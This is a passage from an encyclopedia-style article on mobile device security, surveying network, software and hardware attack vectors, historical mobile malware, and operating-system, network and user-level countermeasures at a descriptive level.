Attacks based on communication networks
[
edit
]


GSM networks
[
edit
]


The attacker may try to break the 
encryption
 of a 
GSM mobile network
. The network encryption algorithms belong to the family of algorithms called 
A5
. Due to the policy of 
security through obscurity
, it has not been possible to openly test the robustness of these algorithms. There were originally two variants of the algorithm: 
A5/1
 and 
A5/2
 (stream ciphers), where the former was designed to be relatively strong, and the latter was purposely designed to be weak to allow easy 
cryptanalysis
 and eavesdropping. 
ETSI
 forced some countries (typically outside Europe) to use A5/2. Since the encryption algorithm was made public, it was proved to be breakable: A5/2 could be broken on the fly, and A5/1 in about 6 hours.
[
18
]
 In July 2007, the 
3GPP
 approved a change request to prohibit the implementation of A5/2 in any new mobile phones, decommissioning the algorithm; it is no longer implemented in mobile phones.

Stronger public algorithms have been added to the GSM standard: the A5/3 and A5/4 (
Block ciphers
), otherwise known as 
KASUMI or UEA1
[
19
]
 published by ETSI. If the network does not support A5/1, or any other A5 algorithm implemented by the phone, then the base station can specify A5/0 which is the null algorithm, whereby the radio traffic is sent unencrypted. Even if mobile phones are able to use 
3G
 or 
4G
 (which have much stronger encryption than 2G GSM), the base station can downgrade the radio communication to 2G GSM and specify A5/0 (no encryption).
[
20
]
 This is the basis for eavesdropping attacks on mobile radio networks using a fake base station commonly called an 
IMSI catcher
.

In addition, tracing of mobile terminals is difficult since each time the mobile terminal is accessing or being accessed by the network, a new temporary identity (TMSI) is allocated to the mobile terminal. The TMSI is used as the identity of the mobile terminal the next time it accesses the network. The TMSI is sent to the mobile terminal in encrypted messages.
[
citation needed
]


Once the encryption algorithm of GSM is broken, the attacker can intercept all unencrypted communications made by the victim's smartphone.



Wi-Fi
[
edit
]


See also: 
Wi-Fi § Network_security


 Access Point spoofing


An attacker can try to eavesdrop on Wi-Fi communications to derive information (e.g., username, password). This type of attack is not unique to smartphones, but they are very vulnerable to these attacks because often Wi-Fi is their only means of communication and access the internet. The security of wireless networks (
WLAN
) is thus an important subject.

Initially, wireless networks were secured by 
WEP
 keys. The weakness of WEP is its short encryption key, which is the same for all connected clients. In addition, several reductions in the search space of the keys have been found by researchers. Now, most wireless networks are protected by the 
WPA
 security protocol. WPA is based on the 
Temporal Key Integrity Protocol
 (TKIP), which was designed to allow migration from WEP to WPA on the equipment already deployed. The major improvements in security are the 
dynamic encryption
 keys. For small networks, the WPA uses a "
pre-shared key
" which is based on a shared key. Encryption can be vulnerable if the length of the shared key is short. With limited opportunities for input (i.e., only the numeric keypad), mobile phone users might define short encryption keys that contain only numbers. This increases the likelihood that an attacker succeeds with a brute-force attack. The successor to WPA, called 
WPA2
, is supposed to be safe enough to withstand a brute force attack.

The ability to access free and fast Wi-Fi gives a business an edge over those who do not. Free Wi-Fi is usually provided by organizations such as airports, coffee shops, and restaurants for a number of reasons, including encouraging customers to spend more time and money on the premises, and helping users stay productive.
[
1
]
 Another reason is enhancing customer tracking: many restaurants and coffee shops compile data about their customers so they can target advertisements directly to their devices.
[
citation needed
]
 This means that customers know what services the facility provides. Generally, individuals filter business premises based on Internet connections as another reason to gain a competitive edge. Network security is the responsibility of the organizations, as unsecured Wi-Fi networks are prone to numerous risks. The man-in-the-middle attack entails the interception and modification of data between parties. Additionally, malware can be distributed via the free Wi-Fi network and hackers can exploit software vulnerabilities to smuggle malware onto connected devices. It is also possible to eavesdrop and sniff Wi-Fi signals using special software and devices, capturing login credentials and hijacking accounts.
[
9
]


As with GSM, if the attacker succeeds in breaking the identification key, both the phone and the entire network it is connected to become exposed to attacks.

Many smartphones remember wireless LANs they have previously connected to, allowing users to not have to re-identify with each connection. However, an attacker could create a Wi-Fi access point twin with the same parameters and characteristics as a real network. By automatically connecting to the fraudulent network, a smartphone becomes susceptible to the attacker, who can intercept any unencrypted data.
[
21
]


Lasco is a worm that initially infects a remote device using the 
SIS file format
,
[
22
]
 a type of script file that can be executed by the system without user interaction. The smartphone thus believes the file to come from a trusted source and downloads it, infecting the machine.
[
22
]




Bluetooth
[
edit
]


Main article: 
Bluetooth § Security


See also: 
Bluesnarfing
 and 
Bluebugging


Security issues related to Bluetooth on mobile devices have been studied and have shown numerous problems on different phones. One easy to exploit 
vulnerability
 is that unregistered services do not require authentication, and vulnerable applications have a 
virtual serial port
 used to control the phone. An attacker only needed to connect to the port to take full control of the device.
[
23
]


In another example, an attacker sends a file via Bluetooth to a phone within range with Bluetooth in discovery mode. If the recipient accepts, a virus is transmitted. An example of this is a worm called Cabir.
[
16
]
 The worm searches for nearby phones with Bluetooth in discoverable mode and sends itself to the target device. The user must accept the incoming file and install the program, after which the worm infects the machine.



Attacks based on vulnerabilities in software applications
[
edit
]


Other attacks are based on flaws in the OS or applications on the phone.



Web browser
[
edit
]


See also: 
Browser security


The 
mobile web browser
 is an emerging attack vector for mobile devices. Just as common Web browsers, mobile web browsers are extended from pure web navigation with widgets and plug-ins or are completely native mobile browsers.

Jailbreaking
 the iPhone with firmware 1.1.1 was based entirely on vulnerabilities on the web browser.
[
24
]
 In this case, there was a vulnerability based on a 
stack-based buffer overflow
 in a library used by the web browser (
LibTIFF
). A similar vulnerability in the web browser for Android was discovered in October 2008.
[
25
]
 Like the iPhone vulnerability, it was due to an obsolete and vulnerable 
library
, but significantly differed in that Android's sandboxing architecture limited the effects of this vulnerability to the Web browser process.

Smartphones are also victims of classic Web 
piracy
 such as phishing, malicious websites, and background-running software. The big difference is that smartphones do not yet have strong 
antivirus software
 available.
[
26
]
[
failed verification
]


The Internet offers numerous interactive features that ensure a higher engagement rate, capture more and relevant data, and increase brand loyalty. Blogs, forums, social networks, and 
wikis
 are some of the most common interactive websites. Due to the tremendous growth of the Internet, there has been a rapid rise in the number of security breaches experienced by individuals and businesses.

Mobile browser users can balance usage and caution in several ways,
[
27
]
 such as reviewing computer security regularly, using secure and secret passwords, and correcting, upgrading, and replacing the necessary features. Installation of 
antivirus
 and anti-spyware programs is the most effective way of protecting the computer, as they offer protection against malware, spyware, and viruses. Additionally, they use 
firewalls
, which are typically installed between trusted networks or devices and the Internet. By acting as a web server, the firewall prevents external users from accessing the internal computer system.
[
28
]
[
failed verification
]




Operating system
[
edit
]


See also: 
Operating system § Security


Sometimes it is possible to overcome the security safeguards by modifying the 
operating system
 (OS) itself, such as the manipulation of 
firmware
 and malicious signature certificates. These attacks are difficult.

In 2004, vulnerabilities in 
virtual machines
 running on certain devices were revealed. It was possible to bypass the 
bytecode
 verifier and access the native underlying operating system.
[
3
]
 The results of this research were not published in detail. The firmware security of Nokia's 
Symbian
 Platform Security Architecture (PSA) is based on a central configuration file called SWIPolicy. In 2008, it was possible to manipulate the Nokia firmware before it was installed. In fact, some downloadable versions of this file were human-readable, so it was possible to modify and change the image of the firmware. 
[
29
]
 This vulnerability was solved by an update from Nokia.

In theory, smartphones have an advantage over hard drives since the OS files are in 
read-only memory
 (ROM) and cannot be changed by malware. However, in some systems it was possible to circumvent this: in the 
Symbian OS
, it was possible to overwrite a file with a file of the same name.
[
29
]
 On the Windows OS, it was possible to change a pointer from a general configuration file to an editable file.

When an application is installed, the 
signing
 of this application is verified by a series of 
certificates
. One can create a valid 
signature
 without using a valid certificate and add it to the list.
[
30
]
 In the Symbian OS, all certificates are in the directory 
c:\resource\swicertstore\dat
. With firmware changes explained above, it is very easy to insert a seemingly valid but malicious certificate.

Android
 is the OS that has been attacked the most, because it has the largest userbase. A cybersecurity company
[
which?
]
 reported to have blocked about 18 million attacks in 2016.
[
31
]




Attacks based on hardware vulnerabilities
[
edit
]


Electromagnetic waveforms
[
edit
]


In 2015, researchers at the French government agency 
Agence nationale de la sécurité des systèmes d'information
 (ANSSI, 
lit.
 
'
French National Agency for the Security of Information Systems
'
) demonstrated the capability to trigger the voice interface of certain smartphones remotely by using "specific 
electromagnetic
 waveforms".
[
4
]
 The exploit took advantage of antenna-properties of headphone wires while plugged into the audio-output jacks of the vulnerable smartphones and effectively spoofed audio input to inject commands via the audio interface.
[
4
]




Juice jacking
[
edit
]


See also: 
Juice jacking


Juice jacking is a physical or hardware vulnerability specific to mobile platforms. Utilizing the dual purpose of the USB charge port, many devices have been susceptible to having data exfiltrated from, or malware installed onto, a mobile device by utilizing malicious charging 
kiosks
 set up in public places or hidden in normal charge adapters.



Jailbreaking and rooting
[
edit
]


Jailbreaking is also a physical access vulnerability, in which a mobile device user hacks into device to unlock it, exploiting weaknesses in the operating system. Mobile device users take control of their own device by jailbreaking it, allowing them to customize the interface by installing applications, change 
system settings
 that are not allowed on the devices, tweak OS processes, and run uncertified programs. This openness exposes the device to a variety of malicious attacks which can compromise private data.
[
5
]




Password cracking
[
edit
]


In 2010, researchers from the University of Pennsylvania investigated the possibility of 
cracking a device's password
 through a 
smudge attack
 (literally imaging the finger smudges on the screen to discern the user's password).
[
27
]
 The researchers were able to discern the device password up to 68% of the time under certain conditions.
[
27
]
 Outsiders may perform over-the-shoulder surveillance on victims, such as watching specific keystrokes or pattern gestures, to unlock device password or passcode.



Malicious software (malware)
[
edit
]


Main article: 
Mobile malware
Malware types based on number of infected smartphones (2009)
[
32
]
As smartphones are a permanent point of access to the Internet (they are often turned on), they can be compromised with malware as easily as computers. A 
malware
 is a computer program that aims to harm the system in which it resides.

Trojans
, 
worms
 and 
viruses
 are all considered malware. A Trojan is a program on a device that allows external users to connect discreetly. A worm is a program that reproduces on multiple computers across a network. A virus is a malicious software designed to spread to other computers by inserting itself into legitimate programs and running programs in parallel.

Malware is far less numerous and serious to smartphones as it is to computers. Nonetheless, recent studies show that the evolution of malware in smartphones have rocketed in the last few years posing a threat to analysis and detection.
[
25
]
 In 2017, mobile malware variants increased by 54%.
[
33
]




Problematic common apps and pre-installed software
[
edit
]


Various common apps installed by millions can intrude on privacy, even if they were installed from a trusted software distribution service like the 
Google Play Store
. For example, in 2022 it was shown that the popular app 
TikTok
 collects a lot of data and is required to make it available to the 
Chinese Communist Party
 (CCP) due to a national security law. This includes personal information on millions of Americans.

The firmware and "stock software" preinstalled on devices – and updated with preinstalled software – can also have undesired components or privacy-intruding default configurations or substantial security vulnerabilities. In 2019, 
Kryptowire
 identified Android devices with malicious firmware that collected and transmitted sensitive data without users' consent.

Analysis of data traffic by popular smartphones running variants of Android found substantial by-default data collection and sharing with no opt-out by 
pre-installed software
.
[
34
]
[
35
]
 This issue also can't be addressed by conventional security patches. Outgoing Internet traffic can be analyzed with 
packet analyzers
 and with firewall apps like the 
NetGuard
 firewall app for Android that allows reading blocked traffic logs.
[
36
]
[
additional citation(s) needed
]




Malware attacks
[
edit
]


Typically, an attack on a smartphone made by malware takes place in three phases: the infection of a host, the accomplishment of its goal, and the spread of the malware to other systems. Malware often uses the resources offered by infected smartphones. It will use the output devices such as Bluetooth or 
infrared
, but it may also use the address book or email address of the person to infect the user's acquaintances. The malware exploits the trust that is given to data sent by an acquaintance.



Infection
[
edit
]


Infection is the method used by malware to gain access to the smartphone; it may exploit an internal vulnerability or rely on the gullibility of the user. Infections are classified into four classes according to their degree of user interaction:
[
37
]




Explicit permission – The most benign interaction is to ask the user if it is allowed to infect the machine, clearly indicating its potential malicious behavior. This is typical behavior of a 
proof of concept
 malware.


Implied permission – This infection is based on the fact that the user has a habit of installing software. Most Trojans try to seduce the user into installing attractive applications (like games or useful applications) that actually contain malware.


Common interaction – This infection is related to a common behavior, such as opening an MMS or email.


No interaction – The device is infected without the user taking action. This class of infection is the most dangerous, as it is both unapproved and automatic.


Accomplishment of its goal


Once the malware has infected a phone, it will also seek to accomplish its goal, which is usually one of the following:
[
38
]




Monetary damages – The attacker can steal user data and either sell them to the same user or sell to a third party.


Data or device damage – Malware can partially damage the device or delete or modify data on the device.


Concealed damage – The two aforementioned types of damage are detectable, but the malware can also leave a 
backdoor
 for future attacks or even conduct 
wiretaps
.


Spread to other systems
[
edit
]


Once the malware has infected a smartphone, it aims to spread to a new host.
[
39
]
 This usually occurs to proximate devices via Wi-Fi, Bluetooth, or infrared; or to remote networks via telephone calls, SMS, or emails.



 Diagram (in French) which ranks common smartphone malware behaviors by frequency.
[
32
]
 At least 50 malware varieties exhibit no negative behavior, except their ability to spread.
[
32
]


Examples
[
edit
]


Viruses and Trojans
[
edit
]


Main article: 
Mobile virus


Cabir
 (also known as Caribe, SybmOS/Cabir, Symbian/Cabir, and EPOC.cabir) is the name of a computer worm developed in 2004, designed to infect mobile phones running 
Symbian OS
. It is believed to have been the first computer worm able to infect mobile phones.


Commwarrior
, created on March 7, 2005, was the first worm able to infect many machines from MMS.
[
16
]
 It is sent as COMMWARRIOR.ZIP containing the file COMMWARRIOR.SIS. When this file is executed, Commwarrior attempts to connect to nearby devices by Bluetooth or infrared under a random name. It then attempts to send MMS message to the contacts in the smartphone with different header messages for each person, who receive the MMS and often open them without further verification.


Phage was the first 
Palm OS
 virus discovered.
[
16
]
 It transfers to the Palm from a PC via 
synchronization
. It infects all applications in the smartphone and embeds its own code to function without the user and the system detecting it. From the system's perspective, all the applications behave as expected.


RedBrowser is a Trojan based on 
Java
.
[
16
]
 The Trojan masquerades as a program called "RedBrowser" which allows the user to visit WAP sites without a WAP connection. During application installation, the user sees a request on their phone that the application needs permission to send messages. If the user accepts, RedBrowser can send SMS to paid call centers. This program uses the smartphone's connection to social networks (e.g., 
Facebook
, 
Twitter
) to get the contact information for the user's acquaintances (provided the required permissions have been given) and will send them messages.


WinCE.PmCryptic.A is a malicious software on Windows Mobile which aims to earn money for its authors. It uses the infestation of memory cards that are inserted in the smartphone to spread more effectively. 
[
40
]


CardTrap is a virus that is available on different types of smartphones, which aims to deactivate the system and third-party applications. It works by replacing the files used to start the smartphone and applications to prevent them from executing.
[
41
]
 There are different variants of this virus such as Cardtrap.A for SymbOS devices. It also infects the memory card with malware capable of infecting 
Windows
.


Ghost Push
 is malicious software on Android OS which automatically 
roots
 the Android device and installs malicious applications directly to system partition. It then unroots the device to prevent users from removing the threat by master reset (the threat can be removed only by reflashing). It cripples the system resources, executes quickly, and is hard to detect.


Ransomware
[
edit
]


Mobile ransomware is a type of malware that locks users out of their mobile devices in a pay-to-unlock-your-device ploy. It has significantly grown as a threat category since 2014.
[
42
]
 Mobile users are often less security-conscious – particularly as it pertains to scrutinizing applications and web links – and trust the mobile device's native protection capability.

Mobile ransomware poses a significant threat to businesses reliant on instant access and availability of their proprietary information and contacts. The likelihood of a traveling businessman paying a ransom to unlock their device is significantly higher since they are at a disadvantage given inconveniences such as timeliness and less direct access to IT staff. Recent ransomware attacks have caused many Internet-connected devices to not work and are costly for companies to recover from.



Spyware
[
edit
]


Main article: 
Spyware


Pegasus
 – In 2021, journalists and researchers reported the discovery of spyware developed and distributed by a private company which can and has been used to infect both iOS and Android smartphones often – partly via use of 
0-day exploits
 – without the need for any user-interaction or significant clues to the user. The spyware is then used to exfiltrate data, track user locations, capture film through its camera, and activate the microphone at any time.
[
43
]


Flexispy is a Symbian application that can be considered a Trojan. The program sends all information received and sent from the smartphone to a Flexispy server. It was originally created to protect children and spy on adulterous spouses.
[
16
]
[
28
]


Portability of malware across platforms
[
edit
]


Attackers can make their malware target multiple platforms. Some malware attacks operating systems but is able to spread across different systems.

To begin with, malware can use runtime environments like 
Java virtual machine
 or the 
.NET Framework
. They can also use other libraries present in many operating systems.
[
44
]
 Some malware carries several executable files in order to run in multiple environments, utilizing these during the propagation process. In practice, this type of malware requires a connection between the two operating systems to use as an attack vector. Memory cards can be used for this purpose, or synchronization software can be used to propagate the virus.



Countermeasures
[
edit
]


Mobile security is divided into different categories, as methods do not all act at the same level and are designed to prevent different threats. These methods range from the management of security by the operating system (protecting the system from corruption by an application) to the behavioral education of the user (preventing the installation of a suspicious software).



Security in operating systems
[
edit
]


The first layer of security in a smartphone is the 
operating system
. Beyond needing to handle the usual roles (e.g., 
resource management
, scheduling processes) on the device, it must also establish the protocols for introducing external applications and data without introducing risk.
[
citation needed
]


A central paradigm in mobile operating systems is the idea of a 
sandbox
. Since smartphones are currently designed to accommodate many applications, they must have mechanisms to ensure these applications are safe for the phone itself, for other applications and data on the system, and for the user. If a malicious program reaches a mobile device, the vulnerable area presented by the system must be as small as possible. Sandboxing extends this idea to compartmentalize different processes, preventing them from interacting and damaging each other. Based on the history of operating systems, sandboxing has different implementations. For example, where 
iOS
 will focus on limiting access to its public API for applications from the App Store by default, Managed Open In allows you to restrict which apps can access which types of data. Android bases its sandboxing on its legacy of 
Linux
 and 
TrustedBSD
.

The following points highlight mechanisms implemented in operating systems, especially Android.



Rootkit detectors


The intrusion of a 
rootkit
 in the system is a great danger in the same way as on a computer. It is important to prevent such intrusions, and to be able to detect them as often as possible. Indeed, there is concern that with this type of malicious program, an attacker could partially or completely bypass the device security, or acquire administrator rights. If this happens, nothing prevents the attacker from studying or disabling the safety features that were circumvented, deploying the applications they want, or disseminating a method of intrusion by a rootkit to a wider audience.
[
45
]
[
46
]


An example of a defense mechanism against this is the 
chain of trust
 (such as in iOS). This mechanism relies on signatures from applications required to start the operating system, and a certificate signed by the manufacturer (Apple). In the event that the signature checks are inconclusive, the device detects this and stops the boot-up.
[
47
]
 If the operating system is compromised due to jailbreaking, rootkit detection may not work if it is disabled by the jailbreak method or software is loaded after jailbreak disables Rootkit Detection.


Process isolation


Android uses mechanisms of user process isolation inherited from Linux. Each application has a user associated with it, and a tuple (
UID
, 
GID
). This approach serves as a sandbox: while applications can be malicious, they cannot get out of the sandbox reserved for them by their identifiers, and thus cannot interfere with the proper functioning of the system. For example, since it is impossible for a process to end the process of another user, an application can thus not stop the execution of another application.
[
45
]
[
48
]
[
49
]
[
50
]
[
51
]


File permissions


From the legacy of Linux, 
filesystem permissions
 mechanisms also help with sandboxing. Permissions prevent a process from editing any files it wants. It is therefore not possible to freely corrupt files necessary for the operation of another application or system. Furthermore, in Android there is the method of locking memory permissions. It is not possible to change the permissions of files installed on the SD card from the phone, and consequently it is impossible to install applications.
[
52
]
[
53
]
[
54
]


Memory protection


In the same way as on a computer, memory protection prevents 
privilege escalation
. This could occur if a process managed to reach an area allocated to other processes, where it could write in the memory of a process with rights superior to its own (with 'root' in the worst case) and perform actions beyond its permissions. It would suffice to insert function calls are authorized by the privileges of the malicious application.
[
51
]


Development through runtime environments


Software is often developed in high-level languages, which can control what is being done by a running program. For example, 
Java virtual machines
 continuously monitor the actions of the execution threads they manage, monitor and assign resources, and prevent malicious actions. Buffer overflows can be prevented by these controls.
[
55
]
[
56
]
[
51
]


Security software
[
edit
]


Above the operating system security, there is a layer of security software. This layer is composed of individual components to strengthen various vulnerabilities: prevent malware, intrusions, the identification of a user as a human, and user authentication. It contains software components that have learned from their experience with computer security; however, on smartphones, this software must deal with greater constraints (see 
limitations
).



Antivirus and firewall


An antivirus software can be deployed on a device to verify that it is not infected by a known threat, usually by signature detection software that detects malicious executable files. A mobile antivirus product would scan files and compare them against a database of known mobile malware code signatures.
[
6
]


A firewall, meanwhile, can watch over the existing traffic on the network and ensure that a malicious application does not seek to communicate through it. It may equally verify that an installed application does not seek to establish suspicious communication, which may prevent an intrusion attempt.
[
57
]
[
58
]
[
59
]
[
46
]


Visual notifications


In order to make the user aware of any abnormal actions, such as a call they did not initiate, one can link some functions to a visual notification that is impossible to circumvent. For example, when a call is triggered, the called number should always be displayed. Thus, if a call is triggered by a malicious application, the user can see, and take appropriate action.


Turing test


It is important to confirm certain actions by a user decision. The 
Turing test
 is used to distinguish between a human and a virtual user, often in the form of a 
CAPTCHA
.


Biometric identification


Another method to use is 
biometrics
,
[
60
]
 a technique of identifying a person by means of their morphology (e.g., by 
recognition of the face
 or eye) or their behavior (e.g., their 
signature or way of writing
). One advantage of using biometric security is that users can avoid having to remember a password or other secret combination to authenticate and prevent malicious users from accessing their devices. In a system with strong biometric security, only the primary user can access the smartphone.


Resource monitoring in the smartphone
[
edit
]


Should a malicious application pass the security barriers, it can take the actions for which it was designed. However, this activity can be sometimes detected by monitoring the various resources used on the phone. Depending on the goals of the malware, the consequences of infection are not always the same; all malicious applications are not intended to harm the devices on which they are deployed.
[
61
]


The following resources are only indications and do not provide certainty about the legitimacy of the activity of an application. However, these criteria can help target suspicious applications, especially if several criteria are combined.



Battery


Some malware is aimed at exhausting the energy resources of the phone. Monitoring the energy consumption of the phone can be a way to detect certain malware applications.
[
45
]


Memory usage


Memory usage is inherent in any application. However, if one finds that an unnecessary or unexpected proportion of memory is used by an application, it may be flagged as suspicious.


Network traffic


As part of normal operation on a smartphone, many applications are bound to connect via the network. However, an application using a lot of bandwidth can be strongly suspected of attempting to communicate a lot of information and disseminate data to many other devices. This observation only allows a suspicion, because some legitimate applications can be very resource-intensive in terms of network communications, the best example being 
streaming video
.


Services


One can monitor the activity of various services of a smartphone. During certain moments, some services should not be active, and if one is detected, the application should be suspected. For example, the sending of an SMS when the user is filming video: this communication does not make sense and is suspicious; malware may attempt to send SMS while its activity is masked.
[
62
]


Network surveillance
[
edit
]


Network traffic
 exchanged by phones can be monitored. One can place safeguards in network routing points in order to detect abnormal behavior. As the mobile's use of network protocols is much more constrained than that of a computer, expected network data streams can be predicted (e.g., the protocol for sending an SMS), which permits detection of anomalies in mobile networks.
[
63
]




Spam filters


Similar to email exchanges, 
spam
 can be detected through means of mobile communications (SMS, MMS). It is therefore possible to detect and minimize this kind of attempt by filters deployed on network infrastructure that is relaying these messages.


Encryption of stored or transmitted information


Because it is always possible that data exchanged can be intercepted, communications and information storage rely on encryption to prevent a malicious entity from using any data obtained during communications. However, this poses the problem of key exchange for encryption algorithms, which requires a secure channel.


Telecom 
network monitoring


The networks for SMS and MMS exhibit predictable behavior, and there is not as much liberty compared with what one can do with protocols such as 
TCP
 or UDP. This implies that one cannot predict the flow of data from common web protocols; a protocol might generate very little traffic by consulting simple pages (rarely) or generate heavy traffic by using video streaming. On the other hand, messages exchanged via mobile phone have a framework and a specific model, and the user does not, in a normal case, have the freedom to intervene in the details of these communications. Therefore, if an abnormality is found in the flux of network data in the mobile networks, the potential threat can be quickly detected.


Manufacturer surveillance
[
edit
]


In the production and distribution chain for mobile devices, manufacturers are responsibility for ensuring that devices are delivered in a basic configuration without vulnerabilities. Most users are not experts and many of them are not aware of the existence of security vulnerabilities, so the device configuration as provided by manufacturers will be retained by many users. Some smartphone manufacturers add 
Titan M2s
 (a security hardware chip) to increase mobile security.
[
64
]
[
65
]




Remove debug mode


Phones are sometimes set in a debug mode during manufacturing, but this mode must be disabled before the phone is sold. This mode allows access to features not intended for routine use by a user. Due to the speed of development and production, distractions occur, and some devices are sold in debug mode. This kind of deployment exposes mobile devices to exploits that utilize this oversight.
[
66
]
[
67
]


Default settings


When a smartphone is sold, its default settings must be correct, and not leave security gaps. The default configuration is not always changed, so a good initial setup is essential for users. There are, for example, default configurations that are vulnerable to denial-of-service attacks.
[
45
]
[
68
]


Security audit of apps


App stores have emerged alongside smartphones. Both users and providers are tasked with examining the immense volume of apps available, from different points of view (e.g., security, content). Security audits should be particularly cautious, because if a fault is not detected, the application can spread very quickly within a few days, and infect a significant number of devices.
[
45
]


Detect suspicious applications demanding rights


When installing applications, it is good to warn the user against sets of permissions that, grouped together, seem potentially dangerous, or at least suspicious. Frameworks like such as Kirin, on Android, attempt to detect and prohibit certain sets of permissions.
[
69
]


Revocation procedures


First developed for Android, a process known as 'remote revocation' can remotely and globally uninstall an application from any device that has it. This means the spread of a malicious application that evaded security checks can be immediately stopped when the threat is discovered.
[
70
]
[
71
]


Avoid heavily customized systems


Manufacturers are tempted to overlay custom layers on existing operating systems, with the dual purpose of offering customized options and disabling or charging for certain features. This has the dual effect of risking the introduction of new bugs in the system, coupled with an incentive for users to modify the systems to circumvent the manufacturer's restrictions. These systems are rarely as stable and reliable as the original and may suffer from phishing attempts or other exploits.
[
citation needed
]


Improve software patch processes


New versions of various software components of a smartphone, including operating systems, are regularly published. These 'patches' correct flaws over time. Nevertheless, manufacturers often do not deploy these updates to their devices in a timely fashion, and sometimes not at all. Thus, vulnerabilities can persist when they could be corrected; while they exist and are generally known, they are easily exploitable.
[
69
]


User awareness
[
edit
]


The user has a large responsibility in the cycle of security. This can be as simple as using a password, or as detailed as precisely controlling which permissions are granted to applications. This precaution is especially important if the user is an employee of a company who stores business data on the device.

Much malicious behavior is allowed by user carelessness. Smartphone users were found to ignore security messages during application installation, especially during application selection and checking application reputation, reviews, security, and agreement messages.
[
72
]
 A recent survey by 
internet security
 experts BullGuard showed a lack of insight concerning the rising number of malicious threats affecting mobile phones, with 53% of users claiming that they are unaware of security software for smartphones. A further 21% argued that such protection was unnecessary, and 42% admitted it hadn't crossed their mind ("Using APA," 2011).
[
full citation needed
]
 These statistics show that consumers are not concerned about security risks because they believe it is not a serious problem. However, in truth, smartphones are effectively handheld computers and are just as vulnerable.

The following are precautions that a user can take to manage security on a smartphone:



Be skeptical


A user should not believe everything that may be presented, as some information may be wrong, misleading, phishing, or attempting to distribute a malicious application. It is therefore advisable to check an application's reputation before buying or installing it.
[
73
]


Permissions given to applications


The mass distribution of applications necessitates different permissions mechanisms for each operating system. It is necessary to clarify these permissions mechanisms to users, as they differ between systems and can be confusing. In addition, it is rarely feasible (or possible) to modify large sets of permissions requested by an application. However, this can be a source of risk because a user can grant an application excessive rights beyond what is necessary. For example, a note-taking application does not require access to the geolocation service to function. During installation, the user must consider an application's privileges and should not accept the installation if the requested rights are inconsistent.
[
74
]
[
68
]
[
75
]


Be careful


A user's phone can be protected through simple gestures and precautions, such as locking the smartphone when it is not in use, not leaving the device unattended, not blindly trusting applications, not storing sensitive data, or encrypting sensitive data that cannot be separated from the device.
[
76
]
[
77
]


Disconnect unused peripheral devices


According to 
NIST Guidelines for Managing the Security of Mobile Devices 2013
, it is recommended to "Restrict user and application access to hardware, such as the digital camera, GPS, Bluetooth interface, USB interface, and removable storage". This can include removing permissions and configurations for unused peripheral devices.


Enable Android Device Encryption
[
edit
]


The latest Android
[
as of?
]
 smartphones come with a built-in encryption setting for securing all the information saved on your device. This makes it difficult for a hacker to extract and decipher the information in case your device is compromised. It can be accessed via: 
Settings → Security → Encrypt Phone + Encrypt SD Card.


Ensure data


Smartphones have significant memory capacity and can carry several gigabytes of data. The user must be careful about what data it carries and whether they should be protected (such as files containing bank information or business data). The user must have the prudence to avoid the transmission of sensitive data on a smartphone, which can be easily stolen. Furthermore, when a user gets rid of a device, they must be sure to remove all personal data first.
[
78
]


These precautions reduce the ability for people or malicious applications to exploit a user's smartphone. If users are careful, many attacks can be defeated, especially phishing and applications seeking only to obtain rights on a device.



Centralized storage
[
edit
]


One form of mobile protection allows companies to control the delivery and storage of text messages, by hosting the messages on a company server, rather than on the sender or receiver's phone. When certain conditions are met, such as an expiration date, the messages are deleted.
[
79
]




Limitations
[
edit
]


The security mechanisms mentioned in this article are to a large extent inherited from knowledge and experience with computer security. The elements composing the two device types are similar, and there are common measures that can be used, such as antivirus software and firewalls. However, the implementation of these solutions is not necessarily possible (or is at least highly constrained) within a mobile device. The reason for this difference is the technical resources available to computers and mobile devices: even though the computing power of smartphones is becoming faster, they have other limitations:



Single-task system
 – Some operating systems, including some still commonly used, are single-tasking. Only the foreground task is executed. It is difficult to introduce applications such as antivirus and firewall on such systems, because they cannot perform their monitoring while the user is operating the device, when monitoring is most needed.


Energy autonomy
 – A critical limitation for smartphones is energy autonomy. It is important that security mechanisms not consume too much battery resources, which could dramatically undermine the smartphone's autonomy and usage.


Network
 – Directly related to battery life, network utilization should not be too high. From the point of view of energy consumption, network utilization is one of the most expensive resources. Nonetheless, some calculations may need to be relocated to remote servers in order to preserve the battery. This balance can make implementation of certain intensive computation mechanisms a delicate situation.
[
80
]


Furthermore, it is common that even if updates exist, or can be developed, they are not always deployed. For example, a user may not be aware of operating system updates; or a user may discover known vulnerabilities that are not corrected until the end of a long development cycle, which allows time to exploit the loopholes.
[
67
]




Next generation of mobile security
[
edit
]


The following mobile environments are expected to make up future security frameworks:



Rich operating system


This category will contain traditional mobile operating systems like Android, iOS, Symbian OS, or Windows Phone. They will provide the traditional functionality and security of an OS to the applications.


Secure Operating System (Secure OS)


This category features a secure kernel which will run in parallel with a fully featured Rich OS, on the same processor core. It will include drivers for the Rich OS ("normal world") to communicate with the secure kernel ("secure world"). The trusted infrastructure could include interfaces like the display or keypad to regions of PCI-E address space and memories.


Trusted Execution Environment (TEE)


This environment will be made up of hardware and software. It helps control of access rights and houses sensitive applications, which need to be isolated from the Rich OS. It effectively acts as a firewall between the "normal world" and "secure world".


Secure Element (SE)


The SE consists of tamper-resistant hardware and associated software or separate isolated hardware. It can provide high levels of security and work in tandem with the TEE. The SE will be mandatory for hosting proximity payment applications or official electronic signatures. SE may connect, disconnect, block peripheral devices, and operate separate set of hardware.


Security Applications (SA)


Numerous security applications are available on app stores, providing protection from viruses and performing vulnerability assessment.
[
81
]


See also
[
edit
]


Browser security


Computer security


Information security


Mobile Malware


Phone hacking


Telephone tapping


Wireless Public Key Infrastructure
 (WPKI)


Wireless security


Defense strategy (computing)


Exploits of mobile security


Notes
[
edit
]






^ 
a
 
b
 
c
 
d
 
e
 
"What is mobile security (wireless security)? - Definition from WhatIs.com"
. 
WhatIs.com
. Retrieved 
2020-12-05
.




^
 
Furnell 2009
, p. 13, CHAPTER 1: GETTING MOBILE.




^ 
a
 
b
 
c
 
"BYOD and Increased Malware Threats Help Driving Billion Dollar Mobile Security Services Market in 2013"
. 
ABI Research
. 2013-03-29
. Retrieved 
2018-11-11
.




^ 
a
 
b
 
c
 
Kasmi C, Lopes Esteves J (13 August 2015). "IEMI Threats for Information Security: Remote Command Injection on Modern Smartphones". 
IEEE Transactions on Electromagnetic Compatibility
. 
57
 (6): 1752–1755. 
doi
:
10.1109/TEMC.2015.2463089
. 
S2CID
 
34494009
.


Andy Greenberg (14 October 2015). 
"Hackers Can Silently Control Siri From 16 Feet Away"
. 
Wired
.




^ 
a
 
b
 
